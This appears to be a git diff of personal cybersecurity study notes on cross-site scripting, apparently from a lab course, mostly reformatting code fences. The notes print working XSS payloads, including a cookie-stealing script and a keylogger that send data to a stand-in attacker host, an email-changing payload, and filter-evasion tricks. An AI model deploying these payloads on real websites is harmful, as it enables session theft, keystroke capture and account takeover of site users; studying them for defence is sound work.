@@ -283,21 +283,28 @@ Cross site scripting
 Injection attack where a malicious payload can be injected into a web page and potentially result in an attacker getting user, staff, or other sensitive data
 
 Check
-````
+	
+~~~
 <script>alert('XSS');</script>
-````
+~~~
+	
 Session stealing:
-````
+	
+~~~
 <script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
-````
+~~~
 Key loggger:
-````
+	
+~~~
 <script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
-````
+~~~
+	
+
 Business Logic 
-````
+	
+~~~
 <script>user.changeEmail('attacker@hacker.thm');</script>
-````
+~~~
 
 #### Stored
 Stored XSS is XSS where a payload is injected into a webpage, and stored at the server level, resulting in that malicious code's presentation to other users of the site. This allows for various serious threats. 
@@ -313,34 +320,46 @@ Attack Vectors:
 Parameters in the URL Query String
 URL File Path 
 
+	
 #### DOM
 DOM-based XSS depends on JS code executing locally and not server-side. This allows for an attacker to exploit specific JS function and then, like reflected XSS, send a link with the malicious code injected. Requires a deeper level of JS to exploit. 
 Attack Vectors:
 eval()
 
+	
 #### Blind
 Blind XSS is XSS where malicious code is presented to other users, as in stored XSS, however you are unable to see it. In order for attackers to take advantage of this XSS, an HTML callback is incorporated into the payload.
 
 
 Evasion:
-````
+	
+~~~
 "><script>alert(1);</script>
-````
+~~~
+	
 Close tag of encapsulating div:
-````
+	
+~~~
 </textarea><script>alert(1);</script>
-````
+~~~
+	
 Filter evasion:
 Filter for 'script' --> sscriptcript
-````
+	
+~~~
 <sscriptcript>alert(1);</sscriptcript>
-````
+~~~
+	
 Within an image:
-````
+	
+~~~
 /images/cat.jpg" onload="alert(1);
-````
+~~~
+	
 Tools:
-````
+	
+~~~
+	
 - xsshunter
 - xsssniper
 - xssstealer
